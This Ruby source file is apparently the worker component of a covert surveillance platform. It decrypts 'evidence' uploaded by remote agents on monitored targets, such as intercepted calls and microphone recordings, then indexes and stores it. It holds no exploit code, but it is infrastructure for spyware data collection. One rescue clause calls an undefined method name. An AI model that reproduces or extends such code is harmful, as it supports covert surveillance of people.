require 'rcs-common/trace'
require 'rcs-common/evidence'
require 'rcs-common/path_utils'

require_release 'rcs-db/config'
require_release 'rcs-db/db_layer'
require_release 'rcs-db/grid'
require_release 'rcs-db/alert'
require_release 'rcs-db/connector_manager'

require_relative 'call_processor'
require_relative 'mic_processor'
require_relative 'single_processor'

require 'mongo'
require 'openssl'
require 'digest/sha1'
require 'digest/md5'
require 'thread'

# specific evidence processors
# TODO: use autoload to prevent code injection
Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
  require file
end

module RCS::Worker
  class InstanceWorker
    include RCS::Tracer

    MAX_IDLE_TIME = 30
    READ_INTERVAL = 3
    READ_LIMIT = 80
    DECODING_FAILED_FOLDER = 'decoding_failed'

    def initialize(instance, ident)
      @instance = instance
      @ident = ident
      @agent_uid = "#{ident}:#{instance}"
    end

    def run
      if !agent?
        delete_all_evidence
        return
      end

      trace(:info, "[#{@agent_uid}] Started. Agent #{agent.id}, target #{target.id}")

      idle_time = 0

      loop do
        @collection ||= db.collection('grid.evidence.files')
        list = @collection.find({}, {sort: ["_id", :asc]}).limit(READ_LIMIT).to_a

        if list.empty?
          idle_time += READ_INTERVAL
          break if idle_time >= MAX_IDLE_TIME
        else
          idle_time = 0
          list.each { |ev| process(ev) }
        end

        sleep(READ_INTERVAL)
      end

      trace(:info, "[#{@agent_uid}] Terminated after #{idle_time} sec of idle time")
    end

    def db
      RCS::Worker::DB.instance.mongo_connection
    end

    def agent?
      @agent, @target = nil, nil
      !!target
    end

    def agent
      @agent ||= Item.agents.where({ident: @ident, instance: @instance, status: 'open'}).first
    end

    def target
      @target ||= agent.get_parent
    end

    def delete_all_evidence
      trace(:error, "[#{@agent_uid}] Agent or target is missing, deleting all related evidence")
      RCS::Worker::GridFS.delete_by_filename(@agent_uid, "evidence")
      true
    end

    # The log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    def decrypt_key
      @decrypt_key ||= Digest::MD5.digest(agent['logkey'])
    end

    def process(grid_ev)
      if !agent?
        @_all_evidence_deleted ||= delete_all_evidence
        return
      end

      raw_id = grid_ev['_id']

      list, decoded_data = decrypt_evidence(raw_id)

      return if list.blank?

      list.each do |ev|
        next if ev.empty?

        trace(:debug, "[#{@agent_uid}] Processing #{ev[:type]} evidence #{raw_id}")

        # store agent instance in evidence (used when storing into db)
        ev[:instance] ||= @instance
        ev[:ident] ||= @ident

        # find correct processing module and extend evidence
        processing_module = "#{ev[:type].to_s.capitalize}Processing".to_sym
        processing_module = RCS.const_defined?(processing_module) ? RCS.const_get(processing_module) : DefaultProcessing
        ev.__send__(:extend, processing_module)

        # post processing
        ev.process if ev.respond_to?(:process)

        # full text indexing
        ev.respond_to?(:keyword_index) ? ev.keyword_index : ev.default_keyword_index

        processor = processor_class(ev[:type])

        # override original type
        ev[:type] = ev.type if ev.respond_to?(:type)

        evidence_id, index = processor.feed(ev, agent, target) do |evidence|
          save_evidence(evidence) if evidence
        end
      end
    rescue Mongo::ConnectionFailure => e
      trace :error, "[#{@agent_uid}] cannot connect to database, retrying in 5 seconds..."
      sleep(5)
      retry
    rescue Exception => e
      trace :fatal, "[#{@agent_uid}] Unrecoverable error processing evidence #{raw_id}: #{e.class} #{e.message}"
      trace :fatal, "[#{@agent_uid}] EXCEPTION: " + e.backtrace.join("\n")

      decode_failed(raw_id, decoded_data) if decoded_data
    ensure
      delete_evidence(raw_id)
    end

    def processor_class(evidence_type)
      case evidence_type
        when 'call'
          @call_processor ||= CallProcessor.new
        when 'mic'
          @mic_processor ||= MicProcessor.new
        else
          @single_processor ||= SingleProcessor.new
      end
    end

    def decode_failed(raw_id, decoded_data)
      Dir.mkdir(DECODING_FAILED_FOLDER) unless File.exists?(DECODING_FAILED_FOLDER)
      path = "#{DECODING_FAILED_FOLDER}/#{raw_id}.dec"
      File.open(path, 'wb') { |file| file.write(decoded_data) }
      trace :debug, "[#{@agent_uid}] Undecoded evidence #{raw_id} stored to #{path}"
    end

    def decrypt_evidence(raw_id)
      content = RCS::Worker::GridFS.get(raw_id, "evidence") rescue nil
      return unless content

      decoded_data = ''

      evidences, action = RCS::Evidence.new(decrypt_key).deserialize(content.read) do |data|
        decoded_data += data unless data.nil?
      end

      return [evidences, decoded_data]
    rescue EmptyEvidenceError => e
      trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] deleting empty evidence #{raw_id}"
      return nil
    rescue EvidenceDeserializeError => e
      trace :warn, "[#{raw_id}:#{@ident}:#{@instance}] decoding failed for #{raw_id}: #{e.to_s}, deleting..."
      decoding_failed(raw_id, decoded_data)
      return nil
    end

    def delete_evidence(raw_id)
      RCS::Worker::GridFS.delete(raw_id, "evidence")
      trace(:debug, "[#{@agent_uid}] deleted raw evidence #{raw_id}")
    rescue Exception => ex
      trace(:error, "[#{@agent_uid}] Unable to delete raw evidence #{raw_id} (maybe is missing): #{ex.message}")
    end

    def save_evidence(evidence)
      # update the evidence statistics
      size = evidence.data.inspect.size
      size += evidence.data[:_grid_size] unless evidence.data[:_grid_size].nil?
      RCS::Worker::StatsManager.instance.add(processed_evidence: 1, processed_evidence_size: size)

      # enqueue in the ALL the queues
      evidence.enqueue
    end

    def to_s
      "Instance worker #{@agent_uid}"
    end
  end
end
